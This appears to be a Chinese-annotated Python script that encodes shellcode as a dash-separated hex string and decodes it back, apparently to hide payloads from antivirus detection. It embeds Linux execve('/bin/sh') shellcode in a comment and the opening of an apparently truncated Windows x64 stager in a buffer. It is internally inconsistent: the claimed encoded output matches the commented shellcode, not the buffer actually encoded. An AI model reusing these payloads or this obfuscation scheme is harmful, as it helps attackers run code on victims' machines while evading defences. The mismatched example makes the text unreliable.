# 以下示例中的shellcode为：
#
# \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7"
buf += b"\x4a\x4a\x4d\x31\xc9\x48\x8b\x72\x50\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b\x42\x3c"
buf += b"\x48\x01\xd0\x41\x51\x66\x81\x78\x18\x0b\x02\x0f"
buf += b"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x50"
buf += b"\x8b\x48\x18\x49\x01\xd0\xe3\x56\x48\xff\xc9\x4d"
buf += b"\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0"
buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
shellcode=buf
#
# ### 加密代码
#
# ```python
# 定义一个存放十六进制字节码数组的函数

def hex_byte_code_arr(shellcode):
    return [hex(b).replace('0x','') for b in shellcode]

# 加密shellcode函数
def encrypt(shellcode):
    # 获取shellcode的十六进制字节码数组
    hex_code_arr = hex_byte_code_arr(shellcode)
    # 将其分组
    part_arrs = list(map(lambda x: '-'.join(hex_code_arr[x*4:(x+1)*4]), list(range(int(len(hex_code_arr)/4)))))
    # 拼接成字符串形式
    return '-'.join(part_arrs)
print(encrypt(bytearray(shellcode)))
a=(encrypt(bytearray(shellcode)))

# ```
#
# ### 解密代码
#
# ```python
def decrypt(encrypted_shellcode):
    # 将字符串先分割成组
    part_arrs = encrypted_shellcode.split('-')
    # 将分割后的组拆开成十六进制字符
    hex_code_arr = [hex_str.strip() for part in part_arrs for hex_str in part.split(',')]
    # 转成二进制数组
    shellcode = [int(b, 16).to_bytes(1, byteorder='little') for b in hex_code_arr]
    return shellcode
def hex_byte_code_arr(shellcode):
    return [bytes([b]).hex() for b in shellcode]
shellcode=(decrypt(a))

shellcode=b''.join(shellcode)
print(shellcode)
# ```
#
# 示例代码中的shellcode加密后为：31-c0-50-68-6e-2f-73-68-68-2f-2f-62-69-89-e3-50-89-e2-53-89-e1-b0-0b-cd-80
